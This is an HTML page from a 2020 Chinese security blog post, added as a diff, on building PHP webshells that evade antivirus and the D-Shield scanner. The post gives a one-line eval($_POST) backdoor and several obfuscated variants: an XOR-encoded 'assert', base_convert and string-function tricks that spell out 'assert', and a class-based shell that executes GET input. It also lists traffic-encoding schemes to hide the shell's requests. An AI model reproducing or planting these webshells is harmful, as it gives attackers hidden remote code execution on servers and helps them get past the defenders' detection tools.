@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="ShangZeng">
+
+
+
+
+
+<title>关于PHP免杀webshell | ShangZeng</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+    "HTML-CSS": {
+        preferredFont: "TeX",
+        availableFonts: ["STIX","TeX"],
+        linebreaks: { automatic:true },
+        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
+        processEscapes: true,
+        ignoreClass: "tex2jax_ignore|dno",
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+        equationNumbers: { autoNumber: "AMS" },
+        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
+        Macros: { href: "{}" }
+    },
+    messageStyle: "none"
+    });
+</script>
+<!-- 给MathJax元素添加has-jax class -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+<!-- 通过连接CDN加载MathJax的js代码 -->
+<script type="text/javascript" async
+        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+    
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">ShangZeng&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                    <a class="menu-item" href="/friends">Friends</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">ShangZeng&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                    <a class="menu-item" href="/friends">Friends</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">关于PHP免杀webshell</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">ShangZeng</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">January 16, 2020&nbsp;&nbsp;4:57:45</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/php/">php</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>一个最简单的一句话木马构造如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[<span class="string">'shangzeng'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里可以简单看成两个部分，首先是命令执行部分，其次是传参接收部分。这两部分构成了一个最简单的后门，而我们要做的就是对这两部分进行混淆，从而达到绕过的目的。</p>
+<h3 id="命令执行部分"><a href="#命令执行部分" class="headerlink" title="命令执行部分"></a>命令执行部分</h3><p>一般使用这两个函数进行:eval和assert</p>
+<p><em>eval</em>是<em>语言构造器</em>，它不可以被用户定义或者添加到语言扩展或者库中，也不能被<em>可变函数</em>调用。而assert是一个<em>断言函数</em>，如果传入的是字符串，那么就会当做代码执行，assert可以被<em>可变函数调</em>用。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $a=<span class="keyword">eval</span>;$a(<span class="string">"phpinfo();"</span>) <span class="meta">?&gt;</span>    <span class="comment">#报错   </span></span><br><span class="line"><span class="meta">&lt;?php</span> $a=assert;$a(<span class="string">"phpinfo();"</span>) <span class="meta">?&gt;</span>  <span class="comment">#执行</span></span><br></pre></td></tr></table></figure>
+
+<p>相对于eval的“不可拆分”，利用assert的这个特点，我们就可以进行加密混淆，从而达到免杀的目的（assert在php7版本也成为了语言构造器，同样也不可拆分调用了）。如果我们选择eval或者高版本的assert作为命令执行，那就要在后面的传参上做文章。</p>
+<h3 id="常见绕过方式"><a href="#常见绕过方式" class="headerlink" title="常见绕过方式"></a>常见绕过方式</h3><p><strong>异或绕过</strong></p>
+<p>异或运算是编程中常见的一种运算，用^或XOR表示，简单总结就是异或运算的两边如果相同，那么结果就是false，如果异或运算的两边不同，那么结果就为true。比如在6^3中，首先是都转化为二进制然后异或，最后是101，也就是5。而字符串的异或是转换成返回对应字符的ascii码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">6&#x3D;》110&#x3D;》101</span><br><span class="line">3&#x3D;》011&#x3D;》101</span><br></pre></td></tr></table></figure>
+
+<p>经过异或后，就能让D盾静态检测不到危险函数的存在,但是还会爆危险函数，变量函数等</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$shang=<span class="string">'tpY&lt;$*'</span>^<span class="string">"\x15\x3\x2a\x59\x56\x5e"</span>;</span><br><span class="line">@$shang($_GET[<span class="string">'a'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>利用字符转换函数进行绕过</strong></p>
+<p>php中存在许多字符串转换函数，利用这些函数对assert进行转换从而达到绕过的目的。</p>
+<p>有兴趣可以去php手册<a href="https://www.w3school.com.cn/php/php_ref_string.asp" target="_blank" rel="noopener">PHP String</a> 函数中找，或者去寻找能构造字母拼接的函数，这里写一些我测试过的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">substr_replace(&quot;astest&quot;,&quot;sert&quot;,2);    函数把字符串的一部分替换为另一个字符串【D盾通过】</span><br><span class="line">substr(&quot;helloassertaaa&quot;,5,6);         返回字符串的一部分【D盾不通过，需要二次拼接】</span><br><span class="line">chop()                                函数移除字符串右端的字符【D盾不通过，需要二次拼接】</span><br><span class="line">strrev()                              函数反转字符串【D盾不通过，需要二次拼接】</span><br><span class="line">base_convert(653016521,10,36)         进制转换函数，36进制转换成10进制【D盾通过】</span><br></pre></td></tr></table></figure>
+
+<h3 id="传参格式部分"><a href="#传参格式部分" class="headerlink" title="传参格式部分"></a>传参格式部分</h3><p>利用种种语言特性来绕过静态查杀的匹配规则，从而达到绕过的目的，常见的有类调用，反序列化，编码，垃圾代码填充，等等方式。下面举个例子：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $name;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">$name= $_GET[<span class="string">"shangzeng"</span>];</span><br><span class="line"><span class="keyword">return</span> $name;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test1</span> <span class="keyword">extends</span> <span class="title">test</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> $aaa;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test3</span> <span class="keyword">extends</span> <span class="title">test2</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> $aaa;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$s = <span class="keyword">new</span> test3();</span><br><span class="line">$shang = base_convert(<span class="number">653016521</span>,<span class="number">10</span>,<span class="number">36</span>);</span><br><span class="line">$zeng = $s-&gt;__wakeup();</span><br><span class="line">$shang($zeng);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.ax1x.com/2020/01/16/ljkO91.png" alt="验证"></p>
+<h3 id="流量部分"><a href="#流量部分" class="headerlink" title="流量部分"></a>流量部分</h3><ol>
+<li><p>base64</p>
+</li>
+<li><p>unicode</p>
+</li>
+<li><p>rot13</p>
+</li>
+<li><p>自己写一些加密</p>
+</li>
+</ol>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>ShangZeng</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://www.shangzeng.club/2020/01/16/%E5%85%B3%E4%BA%8EPHP%E5%85%8D%E6%9D%80/">https://www.shangzeng.club/2020/01/16/%E5%85%B3%E4%BA%8EPHP%E5%85%8D%E6%9D%80/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2020 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY<strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/php/"># php</a>
+                    
+                        <a href="/tags/%E5%85%8D%E6%9D%80/"># 免杀</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/01/16/RGCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">RGCMS代码审计</a>
+            
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© ShangZeng | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
